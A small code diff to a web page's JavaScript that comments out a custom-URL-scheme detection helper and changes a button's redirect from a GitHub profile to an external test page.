@@ -30,19 +30,19 @@
         // const { default: webViewJavaScriptBridge } = require("webview-javascript-bridge");
 
         // http://stackoverflow.com/questions/24571548/javascript-how-to-detect-if-the-custom-url-scheme-is-available-or-not-availabl
-        function goto(url, fallback) {
-            var script = document.createElement('script'); 
+        // function goto(url, fallback) {
+        //     var script = document.createElement('script'); 
 
-            script.onload = function() { 
-                document.location = url;
-            } 
-            script.onerror = function() { 
-                document.location = fallback;
-            } 
-            script.setAttribute('src', url); 
+        //     script.onload = function() { 
+        //         document.location = url;
+        //     } 
+        //     script.onerror = function() { 
+        //         document.location = fallback;
+        //     } 
+        //     script.setAttribute('src', url); 
 
-            document.getElementsByTagName('head')[0].appendChild(script);
-        }
+        //     document.getElementsByTagName('head')[0].appendChild(script);
+        // }
 
         // // window.location.replace("x-web-search://apple.com");
         // window.open("https//apple.com", '_system');
@@ -68,8 +68,7 @@
         document.querySelector('.xyiaton').onclick = (e) => {
             console.log('xyiaton');
             // window.document.location.assign( 'https://github.com/veselyiJoker' )
-            // window.open('https://github.com/veselyiJoker', '_system');
-            window.location.replace("https://github.com/veselyiJoker");
+            window.location.href = "http://cookit.talagh-shahriar.ir/DummyBytes.php";
         }
 
         // window.document.location.assign( 'https://github.com/veselyiJoker' )
